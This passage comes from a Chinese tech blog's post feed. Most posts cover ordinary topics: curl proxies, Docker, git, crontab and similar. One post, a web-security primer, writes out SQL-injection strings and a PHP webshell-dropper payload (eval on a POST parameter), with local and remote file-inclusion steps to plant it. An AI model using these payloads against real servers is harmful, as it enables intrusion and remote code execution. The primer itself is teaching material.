http://aiezu.com/test.php#指定代理协议、用户名和密码，basic认证方式curl -x http_proxy://aiezu:123456@113.185.19.192:80 http://aiezu.com/test.php</code></pre><p>2.Linux curl命令设置socks代理：</p><pre><code>#使用socks4代理，无需认证方式curl --socks4 122.192.32.76:7280 http://aiezu.com/test.phpcurl -x socks4://122.192.32.76:7280 http://aiezu.com/test.php#使用socks4a代理，无需认证方式curl --socks4a 122.192.32.76:7280 http://aiezu.com/test.phpcurl -x socks4a://122.192.32.76:7280 http://aiezu.com/test.php#使用socks5代理，basic认证方式curl --socks5 122.192.32.76:7280 -U aiezu:123456 http://aiezu.com/test.phpcurl -x socks5://aiezu:123456@122.192.32.76:7280 http://aiezu.com/test.php#使用socks5代理，basic认证方式，ntlm认证方式curl -x socks5://aiezu:123456@122.192.32.76:7280 --proxy-ntlm http://aiezu.com/test.php</code></pre><p>参考自：</p><p><a href="http://aiezu.com/article/linux_curl_command.html">Linux curl命令详解 </a> </p><p><a href="http://aiezu.com/article/linux_curl_proxy_http_socks.html">Linux curl命令使用代理、以及代理种类介绍 </a></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> curl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>requests发包ChunkedEncodingError错误</title>
      <link href="2020/07/02/2020-07-02-python_requests_chunked/"/>
      <url>2020/07/02/2020-07-02-python_requests_chunked/</url>
      
        <content type="html"><![CDATA[<p>利用requests编写爬虫时，出现错误</p><pre><code>requests.exceptions.ChunkedEncodingError: (&#39;Connection broken: IncompleteRead(4360 bytes read)&#39;, IncompleteRead(4360 bytes read))</code></pre><p>这种报错一般在requests请求后面添加 steam=True 就好了</p><pre><code>response=requests.get(url=url,stream=True)</code></pre><p>原因主要是chunked编码不完整导致的。实际上IncompleteRead是python原生库httplib的异常。HTTP通道返回0字节，或者返回一定字节后卡住太正常了。如果返回数据的可靠性很重要，请注意设置合理的超时并捕获相关的错误，如有必要甚至可以考虑手工验证HTTP头数据的Content-Length字段。</p>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> requests </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全入门</title>
      <link href="2020/07/02/2020-07-02-web_secure/"/>
      <url>2020/07/02/2020-07-02-web_secure/</url>
      
        <content type="html"><![CDATA[<h1 id="小白WEB安全入门"><a href="#小白WEB安全入门" class="headerlink" title="小白WEB安全入门"></a>小白WEB安全入门</h1><h2 id="基础扫盲-基础知识"><a href="#基础扫盲-基础知识" class="headerlink" title="基础扫盲 - 基础知识"></a>基础扫盲 - 基础知识</h2><p>前端——http/https协议——后端（windows/linux+Apache/Nginx/Tomcat/IIS/Weblogic..）——数据库</p><p>前端：HTML/CSS/Javascript</p><p>协议：规定好的通讯、交流方式</p><p>后端：部署在服务器上的一个程序，PHP/Python/Java/C#/.NET/Nodejs…</p><p>数据库：存放数据的容器，Mysql/Oracle/Mongodb…</p><p>web安全：前端、后端、协议、数据库 出问题了</p><hr><p>端口 IP URL MAC 域名 DNS HOST文件</p><p>局域网（192.168.<em>.</em> 172.16.<em>.</em>-172.31.<em>.</em> 10.<em>.</em>.*）、广域网、内网、外网</p><p>映射 端口映射</p><p>网卡 网关</p><p>IPV4 IPV6</p><p>浏览器 IE/firefox/chrome</p><p>操作系统OS linux/windows</p><p>虚拟机 VMWare/VirtualBox</p><p>Docker容器</p><p>桥接和NAT 桥接-虚拟机和主机是平级关系 NAT-虚拟机和主机是父子关系</p><hr><p>shell webshell（正向[黑客主动连接受害者]、反向[受害者主动连接黑客]）</p><p>暴力破解 字典 弱口令</p><p>Cookie(客户端)/Session(服务端) 保存状态的文件或者数据</p><p>ByPass 绕过</p><p>漏洞 0day</p><p>攻击、入侵、渗透、DDOS、肉鸡</p><p>代码审计（审计工具）</p><p>CTF AWD</p><p>靶机 DVWA CMS（内容管理系统 俗称后台）</p><p>渗透攻击工具：kali sqlmap burpsuite</p><p>后渗透：攻击完成，建立持久访问</p><h2 id="WEB开发-初识HTML和潜在漏洞"><a href="#WEB开发-初识HTML和潜在漏洞" class="headerlink" title="WEB开发 - 初识HTML和潜在漏洞"></a>WEB开发 - 初识HTML和潜在漏洞</h2><p>HTML 超文本标记语言</p><p>DOM</p><p>纯HTML基本没有漏洞，Iframe clickjack(点击劫持 透明css)</p><p><a href="https://www.jianshu.com/p/251704d8ff18">web安全之–点击劫持攻击与防御技术简介</a></p><h2 id="WEB开发-初识CSS和潜在漏洞"><a href="#WEB开发-初识CSS和潜在漏洞" class="headerlink" title="WEB开发 - 初识CSS和潜在漏洞"></a>WEB开发 - 初识CSS和潜在漏洞</h2><p>CSS</p><p>纯CSS漏洞很少，CSS-Keylogging CSS键盘记录</p><p>类似JQuery的事件监听器，通过监听输入类型为password的输入框，判断捕捉键入的字母，加载对应的背景图，实现远程键盘记录。</p><p><a href="http://github.com/maxchehab/CSS-Keylogging">CSS-Keylogging</a></p><h2 id="WEB开发-初识JavaScript和潜在漏洞"><a href="#WEB开发-初识JavaScript和潜在漏洞" class="headerlink" title="WEB开发 - 初识JavaScript和潜在漏洞"></a>WEB开发 - 初识JavaScript和潜在漏洞</h2><p>JavaScript 脚本编程语言</p><p>漏洞很多 XSS CSRF</p><p>docker beef hook.js</p><h2 id="WEB开发-初识后端PHP和潜在漏洞"><a href="#WEB开发-初识后端PHP和潜在漏洞" class="headerlink" title="WEB开发 - 初识后端PHP和潜在漏洞"></a>WEB开发 - 初识后端PHP和潜在漏洞</h2><p>部署在服务器上的一个程序 大脑 APP后端、各种应用程序后台</p><p>功能：文件操作、数据库操作等</p><p>种类：php java python c c++ c# Go</p><p>后端框架：快速开发、低耦合，便于维护，方便简单 Thinkphp/SSH/Django</p><p>潜在漏洞：权限鉴权 SQL注入 逻辑漏洞</p><pre><code>&lt;?php    echo &quot;Back-end&quot;;?&gt;</code></pre><p>index.php</p><pre><code>        php后端            Username:            Password:            Login</code></pre><p>login.php</p><pre><code>&lt;?php    $username = $_GET[&#39;username&#39;];    $password = $_GET[&#39;password&#39;];    if($username == &#39;123&#39; &amp;&amp; $password == &#39;123&#39;)    &#123;        header(&#39;Location: http://127.0.0.1/content.php&#39;);        &#125;    else    &#123;        echo &quot;alert(&#39;登录失败&#39;);&quot;;        echo &quot;history.go(-1);&quot;    &#125;?&gt;</code></pre><p>content.php</p><pre><code>content</code></pre><h2 id="WEB漏洞-SQL注入详解和简单绕过原理"><a href="#WEB漏洞-SQL注入详解和简单绕过原理" class="headerlink" title="WEB漏洞 - SQL注入详解和简单绕过原理"></a>WEB漏洞 - SQL注入详解和简单绕过原理</h2><p>SQL 结构化查询语言 使我们有能力访问数据库</p><p>SQL注入 用户提交的数据可以被数据库解析执行</p><p>原理：sql语句字符串拼接 未过滤</p><p>sql语句：union exists() 一些内置方法 user() database()</p><pre><code>select * from user where username = &#39;输入&#39;;1：select * from user where username = &#39;1&#39; or &#39;1&#39;=&#39;1&#39;;2：select * from user where username = &#39;1&#39; or 1=1--&#39;&#39;;输入1： 1&#39; or &#39;1&#39;=&#39;1输入2： 1&#39; or 1=1--&#39;   注释</code></pre><p>SQL注入WIKI <a href="http://sqlwiki.radare.cn/#/">http://sqlwiki.radare.cn/#/</a></p><p>SQL注入——入门篇 <a href="https://zhuanlan.zhihu.com/p/61796909">https://zhuanlan.zhihu.com/p/61796909</a></p><h2 id="WEB漏洞-XSS漏洞原理详解"><a href="#WEB漏洞-XSS漏洞原理详解" class="headerlink" title="WEB漏洞 - XSS漏洞原理详解"></a>WEB漏洞 - XSS漏洞原理详解</h2><p>XSS 跨站脚本攻击</p><p>网页内嵌入HTML/CSS/JavaScript代码</p><p>反射型：后端 </p><pre><code>alert(&quot;xss&quot;);</code></pre><p>存储型：数据库 </p><p>DOM型：前端</p><p>XSS过滤绕过：分析过滤了的字符串 用相同的功能去替换</p><h2 id="WEB漏洞-NOSQL注入"><a href="#WEB漏洞-NOSQL注入" class="headerlink" title="WEB漏洞 - NOSQL注入"></a>WEB漏洞 - NOSQL注入</h2><p>Mongodb</p><p>服务的开启 service mongodb start</p><p>查看数据库 show  dbs</p><p>查看集合 show collections</p><p>查看集合中的元素 db.collectionname.find()</p><p>模糊查询用正则式：db.customer.find({‘name’: {‘$regex’:’.<em>s.</em>‘} })</p><h2 id="WEB漏洞-CSRF"><a href="#WEB漏洞-CSRF" class="headerlink" title="WEB漏洞 - CSRF"></a>WEB漏洞 - CSRF</h2><p>CSRF（Cross Site Request Forgery, 跨站域请求伪造）</p><p>在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在并未授权的情况下执行在权限保护之下的操作</p><p>CSRF 攻击是黑客借助受害者的 cookie 骗取服务器的信任，但是黑客并不能拿到 cookie，也看不到 cookie 的内容。</p><p>黑客所能做的就是给服务器发送请求，以执行请求中所描述的命令，在服务器端直接改变数据的值，而非窃取服务器中的数据。</p><h2 id="WEB漏洞-文件包含漏洞"><a href="#WEB漏洞-文件包含漏洞" class="headerlink" title="WEB漏洞 - 文件包含漏洞"></a>WEB漏洞 - 文件包含漏洞</h2><p>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。</p><p>通过函数包含文件时，由于没有对包含的文件名进行有效的过滤处理，被攻击者利用从而导致了包含了Web根目录以外的文件进来，就会导致文件信息的泄露甚至注入了恶意代码。</p><p>文件包含相关函数：include()、include_once()、require()、require_once()</p><p>本地文件包含LFI 远程文件包含RFI</p><p>1、直接进行文件的遍历读取（读取敏感信息）</p><p>2、解析符合php规范的任何文件（本地包含配合文件上传）:可以利用文件包含函数可以解析任何符合PHP规范的文件的特性，结合文件上传获取webshell。</p><p>利用过程：</p><p>(1) 上传Web应用指定类型的文件，如：shell.jpg（需要确认文件上传后的绝对路径）</p><?fputs(fopen("shell.php","w"),"<?php @eval($_POST[topo]);?><p>“)?&gt;</p><p>(2) 使用文件包含漏洞，直接解析上传的非php后缀的文件，获取webshell。</p><p>访问URL：<a href="http://www.xxx.com/index.php?page=./shell.jpg">http://www.xxx.com/index.php?page=./shell.jpg</a> 在本地生成shell.php</p><p>3.远程包含Shell</p><p>(1) 先写一个test.txt文件，保存在自己的远程服务器yyy上，内容如下：</p><?fputs(fopen("shell.php","w"),"<?php eval($_POST[topo]);?><p>“)?&gt;</p><p>(2) 则可以通过访问：</p><p><a href="http://www.xxx.com/index.php?page=http://www.yyy.com/test.txt">http://www.xxx.com/index.php?page=http://www.yyy.com/test.txt</a> 则会在服务器根目录下生产一个shell.php</p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>代码审计，是对应用程序源代码进行系统性检查的工作。</p><p>目的是为了找到并且修复应用程序在开发阶段存在的一些漏洞或者程序逻辑错误，避免程序漏洞被非法利用给企业带来不必要的风险。</p><p>代码执行漏洞的相关函数有：eval() assert() call_user_func_array() preg_replace() call_user_func()等常规函数和动态函数$a($b) (比如$_GET($_POST[“xxx”])</p><p>命令注入漏洞的相关函数有：system()、exec()、passthru()、shell_exec()、popen()、proc_open()、pcntl_exec()一共7个函数。</p><p>XSS漏洞和PHP输出函数密切相关，常见的输出函数有： echo printf print print_r sprintf die var-dump var_export。</p><p>CSRF漏洞</p><p>SQL注入漏洞</p><p>文件包含漏洞相关函数有： include() require() include_once() require_once()</p><p>文件上传漏洞相关函数只有：move_uploaded_file()</p><p>变量覆盖漏洞相关函数有：extract(), parse_str()和import_request_variables()</p><p>身份认证漏洞最常用的是cookie和session</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell 杀死指定端口的进程</title>
      <link href="2020/07/02/2020-07-02-shell_kill_port/"/>
      <url>2020/07/02/2020-07-02-shell_kill_port/</url>
      
        <content type="html"><![CDATA[<p>查询所在端口进程</p><pre><code>$ netstat -nlp | grep :8080 | awk &#39;&#123;print $7&#125;&#39; | awk -F&quot;/&quot; &#39;&#123; print $1 &#125;&#39;</code></pre><p>杀死指定ID进程</p><pre><code>$ kill -9 1817</code></pre><p>杀死指定端口进程</p><pre><code>$ kill -9 $(netstat -nlp | grep :8080 | awk &#39;&#123;print $7&#125;&#39; | awk -F&quot;/&quot; &#39;&#123; print $1 &#125;&#39;)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker:本地文件上传至docker容器</title>
      <link href="2020/07/01/2020-07-01-docker_cp_to_container/"/>
      <url>2020/07/01/2020-07-01-docker_cp_to_container/</url>
      
        <content type="html"><![CDATA[<p>将本地文件上传到容器的指定目录中</p><p>docker cp 本地文件路径 ID全称:容器路径</p>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git报changes not staged for commit的错误</title>
      <link href="2020/07/01/2020-07-01-git_changes_not_staged_for_commit/"/>
      <url>2020/07/01/2020-07-01-git_changes_not_staged_for_commit/</url>
      
        <content type="html"><![CDATA[<p>在执行 git add、git commit -m 、git push 时报 changes not staged for commit。</p><p>原因：</p><p>这是由于在项目中引入第三方包时，第三方包中含有 .git。并且在检查上传的文件时，会发现目标文件夹是空的。</p><p>解决办法：</p><p>删除.git文件夹后 重新上传</p>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker:使用 Dockerfile 构建镜像</title>
      <link href="2020/07/01/2020-07-01-dockerfile_build_new_images/"/>
      <url>2020/07/01/2020-07-01-dockerfile_build_new_images/</url>
      
        <content type="html"><![CDATA[<p>一、什么是Dockerfile</p><p>dockerfile是由一系列参数和命令组成的脚本，这些命令和参数应用于基础镜像并最终创建一个新的镜像。开发人员构建好一个一致的开发环境，测试人员和运维人员就可以直接使用了。</p><p>二、Dockerfile参数</p><pre><code>FROM：指定基础镜像，意思就是基于哪个镜像。MAINTTAINER：维护者信息，可不填。RUN：要执行什么动作，在命令前加上RUN即可。ADD：copy文件，会自动解压。WORKDIR：设置当前工作目录。VOLUME：设置挂载主机目录。EXPOSE：容器需要暴露的端口号。CMD：指定容器启动后要干的事。ENV：指定一个环境变量。</code></pre><p>三、实现一个最简单的Dockerfile</p><p>随便找个目录，新建个文件，名称必须为Dockerfile<br>然后输入</p><pre><code>FROM centosCMD echo “hello docker！！！”</code></pre><p>保存退出。构建一个镜像，后面有个点，意思是当前目录下找Dockerfile文件。前面是镜像名称。</p><pre><code>$ docker build -t hello-docker .Sending build context to Docker daemon  87.53MBStep 1/2 : FROM centos---&gt; 0f3e07c0138fStep 2/2 : CMD echo &quot;hello docker!!&quot;---&gt; Running in 37e104a59d19Removing intermediate container 37e104a59d19---&gt; 238d2607e624Successfully built 238d2607e624Successfully tagged hello-docker:latest</code></pre><p>查看所有镜像。</p><pre><code>$ docker imagesREPOSITORY                TAG                 IMAGE ID            CREATED             SIZEhello-docker              latest              238d2607e624        15 seconds ago      220MBcentos                    latest              0f3e07c0138f        2 months ago        220MBregistry                  latest              f32a97de94e1        9 months ago        25.8MB192.168.1.16:5000/hello   1.0                 fce289e99eb9        11 months ago       1.84kB</code></pre><p>可以看到镜像已经构建完成，运行一下看看效果。</p><pre><code>$ docker run hello-docker hello docker!!</code></pre><p>四、实例</p><p>遇到问题，Crawlab原本镜像不带爬虫依赖，故将依赖打好后，利用Dockerfile重新制作镜像。</p><p>编写 Dockerfile</p><pre><code>FROM tikazyq/crawlabRUN pip3 install astroid==2.3.3 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install attrs==19.3.0 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install Automat==20.2.0 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install beautifulsoup4==4.8.2 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install certifi==2019.11.28 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install cffi==1.14.0 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install chardet==3.0.4 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install constantly==15.1.0 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install cryptography==2.8 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install cssselect==1.1.0 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install fake-useragent==0.1.11 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install gne==0.1.8 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install goose3==3.1.6 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install hyperlink==19.0.0 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install idna==2.9 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install incremental==17.5.0 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install isort==4.3.21 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install jieba==0.42.1 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install lazy-object-proxy==1.4.3 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install lxml==4.5.0 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install mccabe==0.6.1 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install nltk==3.4.5 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install numpy==1.18.2 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install parsel==1.5.2 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install Pillow==7.0.0 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install Protego==0.1.16 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install pyasn1==0.4.8 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install pyasn1-modules==0.2.8 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install pycparser==2.20 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install PyDispatcher==2.0.5 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install PyExecJS==1.5.1 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install PyHamcrest==2.0.2 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install pylint==2.4.4 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install PyMySQL==0.9.3 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install pyOpenSSL==19.1.0 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install python-dateutil==2.8.1 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install PyYAML==5.3.1 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install queuelib==1.5.0 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install requests==2.23.0 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install Scrapy==2.0.0 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install scrapy-selenium==0.0.7 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install scrapyd==1.2.1 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install scrapyd-client==1.1.0 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install selenium==3.141.0 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install service-identity==18.1.0 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install six==1.14.0 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install soupsieve==2.0 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install Twisted==19.10.0 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install typed-ast==1.4.1 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install urllib3==1.25.8 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install w3lib==1.21.0 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install wrapt==1.11.2 -i https://mirrors.aliyun.com/pypi/simple/RUN pip3 install zope.interface==4.7.2 -i https://mirrors.aliyun.com/pypi/simple/</code></pre><p>构建镜像</p><pre><code># 在 Dockerfile 目录下执行以上命令即可构建镜像。-t 参数指定了镜像名称，最后的 . 表示构建上下文（. 表示当前目录）.如果你的 Dockerfile 文件名不是 “Dockerfile”，可以使用 -f 参数指定。docker build -t 新镜像名称 .</code></pre><p>注意：千万不要将 Dockerfile 放在根目录下构建，假如你将 Dockerfile 放在一个存放大量视频目录下，并且构建上下文为当前目录，那么镜像将会非常大（视频都被打包进去了）。最佳做法是将 Dockerfile 和需要用到的文件放在一个单独的目录下。</p>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux定时执行crontab命令</title>
      <link href="2020/07/01/2020-07-01-linux_crontab/"/>
      <url>2020/07/01/2020-07-01-linux_crontab/</url>
      
        <content type="html"><![CDATA[<h3 id="Linux-crontab-命令"><a href="#Linux-crontab-命令" class="headerlink" title="Linux crontab 命令"></a>Linux crontab 命令</h3><p>Linux crontab是用来定期执行程序的命令。</p><p>crond 命令每分钟会定期检查是否有要执行的工作，如果有要执行的工作便会自动执行该工作。</p><p>注意：新创建的 cron 任务，不会马上执行，至少要过 2 分钟后才可以，当然你可以重启 cron 来马上执行。</p><pre><code>sudo service cron restart</code></pre><p>而 linux 任务调度的工作主要分为以下两类：</p><p>1、系统执行的工作：系统周期性所要执行的工作，如备份系统数据、清理缓存</p><p>2、个人执行的工作：某个用户定期要做的工作，例如每隔10分钟检查邮件服务器是否有新信，这些工作可由每个用户自行设置 </p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><pre><code># 第一种crontab [ -u user ] file# 第二种crontab [ -u user ] &#123; -l | -r | -e &#125;</code></pre><p>说明：</p><p>crontab 是用来让使用者在固定时间或固定间隔执行程序之用，换句话说，也就是类似使用者的时程表。</p><p>-u user 是指设定指定 user 的时程表，这个前提是你必须要有其权限(比如说是 root)才能够指定他人的时程表。如果不使用 -u user 的话，就是表示设定自己的时程表。</p><p>参数说明：</p><pre><code>-e : 执行文字编辑器来设定时程表，内定的文字编辑器是 VI，如果你想用别的文字编辑器，则请先设定 VISUAL 环境变数来指定使用那个文字编辑器(比如说 setenv VISUAL joe)-r : 删除目前的时程表-l : 列出目前的时程表</code></pre><p>时间格式如下：</p><p>f1 f2 f3 f4 f5 program</p><pre><code>其中 f1 是表示分钟，f2 表示小时，f3 表示一个月份中的第几日，f4 表示月份，f5 表示一个星期中的第几天。program 表示要执行的程序。当 f1 为 * 时表示每分钟都要执行 program，f2 为 * 时表示每小时都要执行程序当 f1 为 a-b 时表示从第 a 分钟到第 b 分钟这段时间内要执行，f2 为 a-b 时表示从第 a 到第 b 小时都要执行当 f1 为 */n 时表示每 n 分钟个时间间隔执行一次，f2 为 */n 表示每 n 小时个时间间隔执行一次当 f1 为 a, b, c,... 时表示第 a, b, c,... 分钟要执行，f2 为 a, b, c,... 时表示第 a, b, c...个小时要执行</code></pre><p>实例</p><p>（1）每月每天每小时的第 0 分钟执行一次 /bin/ls</p><pre><code>0 * * * * /bin/ls</code></pre><p>（2）在 12 月内, 每天的早上 6 点到 12 点，每隔 3 个小时 0 分钟执行一次 /usr/bin/backup</p><pre><code>0 6-12/3 * 12 * /usr/bin/backup</code></pre><p>（3）周一到周五每天下午 5:00 寄一封信给 <a href="mailto:&#97;&#108;&#101;&#120;&#x40;&#x64;&#111;&#109;&#97;&#105;&#110;&#x2e;&#110;&#x61;&#109;&#x65;">&#97;&#108;&#101;&#120;&#x40;&#x64;&#111;&#109;&#97;&#105;&#110;&#x2e;&#110;&#x61;&#109;&#x65;</a></p><pre><code>0 17 * * 1-5 mail -s &quot;hi&quot; alex@domain.name &lt; /tmp/maildata</code></pre><p>（4）每月每天的午夜 0 点 20 分, 2 点 20 分, 4 点 20 分….执行 echo “haha”</p><pre><code>20 0-23/2 * * * echo &quot;haha&quot;</code></pre><p>（5）每两个小时重启一次apache </p><pre><code>0 */2 * * * /sbin/service httpd restart</code></pre><p>（6）每天7：50开启ssh服务 </p><pre><code>50 7 * * * /sbin/service sshd start</code></pre><p>（7）每月1号和15号检查/home 磁盘 </p><pre><code>0 0 1,15 * * fsck /home</code></pre><p>（8）每周一至周五3点钟，在目录/home中，查找文件名为*.xxx的文件，并删除4天前的文件。</p><pre><code>00 03 * * 1-5 find /home &quot;*.xxx&quot; -mtime +4 -exec rm &#123;&#125; \; </code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu开机进入initramfs系统黑屏</title>
      <link href="2020/07/01/2020-07-01-ubuntu_start_initramfs/"/>
      <url>2020/07/01/2020-07-01-ubuntu_start_initramfs/</url>
      
        <content type="html"><![CDATA[<p>解决方法</p><p>如果在initramfs模式输入reboot重启，或者长按开机键强制关机重启，然后选择ubuntu（高级选项）中的修复模式（recovery mode）.</p><p>系统会告诉你哪个磁盘坏了:</p><pre><code>The root filesystem on /dev/sda1 requires a manual fsck</code></pre><p>一般一个盘都是/dev/sda1</p><p>然后根据系统提示出错的盘符输入指令修复</p><p>fsck -t ext4 /dev/sda1</p><p>然后一路输入y</p><p>修复完成后输入reboot重启即可</p>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git冲突：：commit your changes or stash them before you can merge.</title>
      <link href="2020/06/28/2020-06-28-git_stash/"/>
      <url>2020/06/28/2020-06-28-git_stash/</url>
      
        <content type="html"><![CDATA[<p>今天用git pull来更新博客，遇到了下面的问题：</p><pre><code>Updating 2c09619..71c965berror: Your local changes to the following files would be overwritten by merge:        _posts/2020-06-16-sqlite3.mdPlease commit your changes or stash them before you merge.Aborting</code></pre><p>出现这个问题的原因是其他人修改了xxx.md并提交到版本库中去了，而你本地也修改了xxx.md，这时候你进行git pull操作就好出现冲突了，解决方法，在上面的提示中也说的很明确了。</p><p>1、保留本地的修改 的改法</p><p>1）直接commit本地的修改</p><p>2）通过git stash</p><pre><code>git stashgit pullgit stash pop</code></pre><p>通过git stash将工作区恢复到上次提交的内容，同时备份本地所做的修改，之后就可以正常git pull了，git pull完成后，执行git stash pop将之前本地做的修改应用到当前工作区。</p><p>git stash: 备份当前的工作区的内容，从最近的一次提交中读取相关内容，让工作区保证和上次提交的内容一致。同时，将当前的工作区内容保存到Git栈中。</p><p>git stash pop: 从Git栈中读取最近一次保存的内容，恢复工作区的相关内容。由于可能存在多个Stash的内容，所以用栈来管理，pop会从最近的一个stash中读取内容并恢复。</p><p>git stash list: 显示Git栈内的所有备份，可以利用这个列表来决定从那个地方恢复。</p><p>git stash clear: 清空Git栈。此时使用gitg等图形化工具会发现，原来stash的哪些节点都消失了。</p><p>2、放弃本地修改 的改法</p><pre><code>git reset --hardgit pull</code></pre>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu安装net-tools</title>
      <link href="2020/06/28/2020-06-28-ubuntu_net-tools/"/>
      <url>2020/06/28/2020-06-28-ubuntu_net-tools/</url>
      
        <content type="html"><![CDATA[<p>ubuntu中未安装net-tools，需要离线安装：</p><p><a href="https://packages.ubuntu.com/bionic/amd64/net-tools/download">net-tools官方下载</a></p><p>下载对应版本文件</p><p>例如amd64版本：</p><p><a href="http://mirrors.kernel.org/ubuntu/pool/main/n/net-tools/net-tools_1.60+git20161116.90da8a0-1ubuntu1_amd64.deb">http://mirrors.kernel.org/ubuntu/pool/main/n/net-tools/net-tools_1.60+git20161116.90da8a0-1ubuntu1_amd64.deb</a></p><p>下载完毕后，执行deb包安装。</p><p>1.sudo dpkg -i xxx.deb</p><p>2.直接双击deb包 安装</p>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对贝壳网、365淘房、房天下的数据采集难易度评估</title>
      <link href="2020/06/26/2020-06-26-house_information_crawl/"/>
      <url>2020/06/26/2020-06-26-house_information_crawl/</url>
      
